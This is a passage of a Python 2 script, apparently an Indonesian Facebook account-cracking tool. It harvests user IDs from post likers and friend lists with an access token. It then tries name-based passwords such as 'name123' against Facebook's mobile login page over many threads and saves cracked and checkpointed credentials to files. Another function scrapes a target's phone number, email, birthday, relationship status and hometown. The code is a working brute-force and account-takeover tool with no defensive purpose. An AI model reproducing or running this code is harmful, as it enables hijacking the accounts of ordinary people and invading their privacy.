				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"1234")
					pwx.append(ss+"12345")
				else:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m===> ' +uid+ '|' + pw + '       ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  ===> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r  \033[0;93m===> ' +uid+ '|' + pw + '|' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('   <===>> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93m===> ' +uid+ '|' + pw + '       ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  <===>> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Selesai")

def reaction():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Ex :/post/\033[0;92m629986xxxxx\033[0;97m (only id post)")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Post : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Postingan Missing!')
	r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=5000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
		id.append(uid+'<=>'+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Use Manual Password Or Not? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      '\r \033[0;97m[%s*\033[0;97m] Proses Crack %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					#pwx.append(ss+"1234")
					pwx.append(ss+"12345")
				else:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
					pwx.append(ss+"1234")
					
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m===> ' +uid+ '|' + pw + '       ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  ===> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r  \033[0;93m===> ' +uid+ '|' + pw + '|' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  ===> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93m===> ' +uid+ '|' + pw + '       ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] It's Enough")

def manual():
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Contoh : bismillah,sayang,indonesia")
	pw = raw_input(" \033[0;97m[\033[0;93m?\033[0;97m] Create Password : ")
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Crack Dengan Password : \033[0;91m%s"%(pw))
	if len(pw) ==0:
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] Fill it Correctly")
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		sys.stdout.write('\r \033[0;93m[\033[0;93m×\033[0;93m] Proses Crack %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("<=>")
		ss = name.split(" ")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for asu in pw.split(","):
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m===> ' +uid+ '|' + asu + '       ')
					ok.append(uid+'|'+asu)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  ===> '+str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						print('\r  \033[0;93m===> ' +uid+ '|' + asu + '|' + ttl)
						cp.append(uid+'|'+asu+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  ===> '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93m===> ' +uid+ '|' + asu + '       ')
					cp.append(uid+'|'+asu)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  ===> '+str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Selesai")
	
### SETTING UA
def settua():
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] You want to change the user agent? [Y/t] : ") 
	if ask =="":
		menu()
	elif ask == "y" or ask == "Y":
		try:
			print("\n \033[0;97m[\033[0;93m*\033[0;97m] Type Search In Browser : My User Agent")
			ua = raw_input(" \033[0;97m[\033[0;96m+\033[0;97m] User Agent : ") 
			uas = open(".ua","w")
			uas.write(ua) 
			uas.close()
			print(" \033[0;97m[\033[0;92m✓\033[0;97m] Successfully Changing User-Agent")
			time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
	elif ask == "t" or ask == "T":
		try:
			ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
			uas = open(".ua","w")
			uas.write(ua) 
			uas.close()
			print("\n \033[0;97m[\033[0;92m✓\033[0;97m] Successfully Changing User-Agent")
			time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
	else:
		menu()

def cek_ingfo():
    try:
        __cindy__= open('login.txt', 'r').read()
    except (KeyError, IOError):
        print(p+'\n Token Facebook Erorr !!')
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
        
    try:
#	print(p+"Buruan Ketik/Copy : "+i+"User"+p+"How To Get ID Facebook !!");time.sleep(2)
        ajg = raw_input(c+'\n ['+p+'?'+c+']'+p+'Masukkan ID Target :'+k+' ')
        if ajg in ('user', 'User', 'USER'):
        	print(p+"You will be redirected to the browser")
        	os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
        	cek_ingfo()
    except (KeyError, IOError):
	cek_ingfo()
    try:
        otw = requests.get('https://graph.facebook.com/%s?access_token=%s'%(ajg, __cindy__))
	a = json.loads(otw.text)
        otww = requests.get('https://graph.facebook.com/%s?access_token=%s'%(ajg, __cindy__))
	x = json.loads(otww.text)
	nama = a['name']
	namade = a['first_name']
    	namabe = x['last_name']
    	idfb = x['id']
    	user = x['username']
    	ttll = x['birthday']
    	tzim = x['timezone']
    	stas = x['relationship_status']
    	dgn = '''dengan %s'''%(x['significant_other']['name'])
    	tigl = x['location']['name']
    	dari = x['hometown']['name']
    	lins = x['link']
    	uptd = x['updated_time']
    	nmrr = x['mobile_phone']
    	emai = x['email']
    	bioo = x['about']
	gndr = x['gender']
    except (KeyError, IOError):
	nama = M+"—"+c
	namade= M+"—"+c
	namabe= M+"—"+c
	idfb = M+"—"+c
	user = M+"—"+c
	ttll = M+"—"+c
	tzim = M+"—"+c
	stas = M+"—"+c
	dgn = M+"—"+c
	tigl = M+"—"+c
	dari = M+"—"+c
	lins = M+"—"+c
	uptd = M+"—"+c
	nmrr = M+"—"+c
	emai = M+"—"+c
    	bioo = M+"—"+c
    	gndr = M+'—'+c
    try:
    	r = requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(ajg, __cindy__))
        z = json.loads(r.text)
        for i in z['data']:
        	uid = i['id']
        	na = i['name']
        	nm = na.rsplit(' ')[0]
        	id.append(uid + '|' + nm)
    except: pass
    try:
    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(ajg, __cindy__))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
    	pengikut = '%s-%s'%(M,N)
    except: pass
    print '\n  '+p+'Informasi Account Facebook';time.sleep(0.03)
    print c+' ['+m+'!'+c+']'+p+'Name Lengkap     : %s'%(nama);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Name Depan       : '+namade+'';time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Name Belakang    : %s'%(namabe);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'ID Facebook      : %s'%(idfb);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Username Facebook: %s'%(user);time.sleep(0.03)
    print '\n  '+b+'* '+p+'Facebook Account Data '+b+'*\n';time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Gmail Facebook   : %s'%(emai);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Number Telepons   : %s'%(nmrr);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Date of birth    : %s'%(ttll);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Gender                : %s'%(gndr);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Number Of Teman     : %s'% str(len(id));time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Number Of Followers : %s'%(pengikut);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Link Facebook    : %s'%(lins);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Relationship Status  : %s %s'%(stas,dgn);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'About Status   : %s'%(bioo);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Home town        : %s'%(dari);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Date               : %s'%(tigl);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Time Zone       : %s'%(tzim);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'Last Updated : %s'%(uptd);time.sleep(0.03)
    print ' ['+m+'!'+c+']'+p+'------------------------------------------------'+b+'⟩⟩'
    time.sleep(3)
    print(p+"Author : Muhammad Dicky Wahyudi")
    print(p+"Script : Muhammad Dicky Wahyudi ")
    time.sleep(2)
    print("Successfully Checking Facebook Data")
    raw_input('\n  [ %Back%s ] '%(O,N))
    menu()
    
if __name__ == '__main__':
	menu()